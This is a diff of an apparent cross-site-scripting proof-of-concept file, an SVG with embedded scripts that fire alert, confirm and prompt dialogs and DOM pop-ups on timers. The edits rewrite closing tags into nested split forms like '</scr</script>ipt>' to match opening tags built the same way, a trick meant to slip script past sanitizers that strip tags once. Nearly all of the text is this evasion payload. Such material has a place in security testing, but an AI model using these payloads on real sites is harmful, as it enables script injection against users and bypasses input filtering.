@@ -19,21 +19,21 @@
     <!-- Technique 1: Standard Alert (Immediate) -->
     <scr<script>ipt>
         alert('XSS PoC: Standard alert triggered on load');
-    </script>
+    </scr</script>ipt>
     
     <!-- Technique 2: Confirm Dialog (After 2 seconds) -->
     <scr<script>ipt>
         setTimeout(() => {
             confirm('XSS PoC: Confirm dialog - click OK or Cancel');
         }, 2000);
-    </script>
+    </sc</script>ript>
     
     <!-- Technique 3: Prompt Dialog (After 4 seconds) -->
     <scr<script>ipt>
         setTimeout(() => {
             prompt('XSS PoC: Prompt dialog - enter text', 'Type here');
         }, 4000);
-    </sc<script>ript>
+    </sc</script>ript>
     
     <!-- Technique 4: Custom DOM-Based Pop-Up (After 6 seconds) -->
     <scr<script>ipt>
@@ -52,7 +52,7 @@
             popup.appendChild(div);
             document.querySelector('svg').appendChild(popup);
         }, 6000);
-    </script>
+    </scr</script>ipt>
     
     <!-- Technique 5: ForeignObject with HTML Pop-Up (After 8 seconds) -->
     <foreignObject x="150" y="220" width="300" height="100">
